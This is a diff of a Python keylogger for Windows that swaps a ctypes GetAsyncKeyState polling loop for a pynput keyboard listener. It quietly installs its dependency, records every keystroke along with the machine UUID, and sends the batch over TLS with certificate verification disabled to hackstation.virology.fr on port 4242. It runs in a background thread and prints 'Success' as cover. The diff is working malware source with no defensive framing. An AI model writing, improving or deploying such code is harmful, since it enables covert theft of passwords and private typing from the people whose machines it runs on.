@@ -1,88 +1,74 @@
-
 import threading
 
 def main():
-    import ctypes
-    import ssl
-    import socket
-    import time
-    import os
-    import queue
+    import importlib
+    import subprocess
 
-    keystroke_buffer = queue.Queue()
+    required_packages = {
+        "pynput": None,
+    }
+
+    for package, alias in required_packages.items():
+        try:
+            imported_module = importlib.import_module(package)
+            if alias:
+                globals()[alias] = imported_module
+            else:
+                globals()[package] = imported_module
+        except ImportError:
+            subprocess.check_call([r"C:\Temp\05ft8_2lthb4\Scripts\pip.exe", "install", package])
+            imported_module = importlib.import_module(package)
+            if alias:
+                globals()[alias] = imported_module
+            else:
+                globals()[package] = imported_module
+
+    from pynput import keyboard
 
     HOST = 'hackstation.virology.fr'
     PORT = 4242
+    keystrokes = []
+    password_to_stop = "Supe4Pa55wOrd"
 
-    VK_SHIFT = 0x10
-    VK_CAPITAL = 0x14
-    VK_CONTROL = 0x11
-    VK_MENU = 0x12  # ALT key
+    def send_keystrokes(uid):
+        import ssl
+        import socket
+        nonlocal keystrokes
+        if keystrokes:
+            try:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                with socket.create_connection((HOST, PORT)) as sock:
+                    with context.wrap_socket(sock, server_hostname=HOST) as ssock:
+                        keystrokes_str = "".join(k.decode() if isinstance(k, bytes) else k for k in keystrokes)
+                        message = f"keylogger|||{uid}|||{keystrokes_str}".encode()
+                        ssock.sendall(message)
+                        keystrokes = []
+            except Exception as e:
+                print(f"Error sending keystrokes: {e}")
 
-    user32 = ctypes.windll.user32
+    def on_press(key):
+        nonlocal keystrokes
+        try:
+            keystrokes.append(key.char.encode())
+        except AttributeError:
+            keystrokes.append(f"[{key.name}]")
 
-    GetAsyncKeyState = user32.GetAsyncKeyState
-    GetKeyboardLayout = user32.GetKeyboardLayout
-    MapVirtualKeyW = user32.MapVirtualKeyW
-    ToUnicode = user32.ToUnicode
-    GetKeyState = user32.GetKeyState
+        keystrokes_str = "".join(k.decode() if isinstance(k, bytes) else k for k in keystrokes)
+        if password_to_stop in keystrokes_str.replace("[space]", " ").replace("[backspace]", "").replace("[shift]", ""):
+            return False
 
-    prev_key_states = [0] * 256
+        if len(keystrokes) > 100:
+            send_keystrokes(uid)
 
-    uid = os.popen("wmic csproduct get uuid").read().strip().splitlines()[-1]
+    import os
+    with keyboard.Listener(on_press=on_press) as listener:
+        uid = os.popen("wmic csproduct get uuid").read().strip().splitlines()[-1]
+        while listener.running:
+            send_keystrokes(uid)
+            listener.join(1)
 
-    while True:
-        for vk_code in range(256):
-            key_state = GetAsyncKeyState(vk_code)
-            if key_state & 0x8000:
-                if prev_key_states[vk_code] == 0:
-                    scan_code = MapVirtualKeyW(vk_code, 0)
-                    buffer = ctypes.create_unicode_buffer(4)
-
-                    # Get the states of SHIFT and CAPS LOCK
-                    shift_state = GetKeyState(VK_SHIFT) & 0x8000
-                    caps_lock_state = GetKeyState(VK_CAPITAL) & 0x0001
-
-                    # Define the keyboard state array
-                    keyboard_state = (ctypes.c_ubyte * 256)()
-                    user32.GetKeyboardState(ctypes.byref(keyboard_state))
-
-                    # Modify the keyboard state to include SHIFT and CAPS LOCK states
-                    if shift_state:
-                        keyboard_state[VK_SHIFT] = 0x80  # Set SHIFT key as pressed
-                    if caps_lock_state:
-                        keyboard_state[VK_CAPITAL] = 0x01  # Set CAPS LOCK as toggled
-
-                    # Translate the virtual key code to a character using ToUnicode
-                    result = ToUnicode(vk_code, scan_code, keyboard_state, buffer, len(buffer), 0)
-                    if result > 0:
-                        char = buffer.value
-                        keystroke_buffer.put(char.encode())
-
-                prev_key_states[vk_code] = 1
-            else:
-                prev_key_states[vk_code] = 0
-
-        if not keystroke_buffer.empty():
-            keystrokes = []
-            while not keystroke_buffer.empty():
-                keystrokes.append(keystroke_buffer.get(block=True))
-
-            if keystrokes:
-                try:
-                    context = ssl.create_default_context()
-                    context.check_hostname = False
-                    context.verify_mode = ssl.CERT_NONE
-                    with socket.create_connection((HOST, PORT)) as sock:
-                        with context.wrap_socket(sock, server_hostname=HOST) as ssock:
-                            message = b"keylogger|||" + uid.encode() + b"|||" + b''.join(keystrokes)
-                            ssock.sendall(message)
-                except ConnectionRefusedError:
-                    pass
-                except ssl.SSLError:
-                    pass
-
-        time.sleep(0.005)
-
-threading.Thread(target=main).start()
+t = threading.Thread(target=main)
+t.start()
 print("Success")
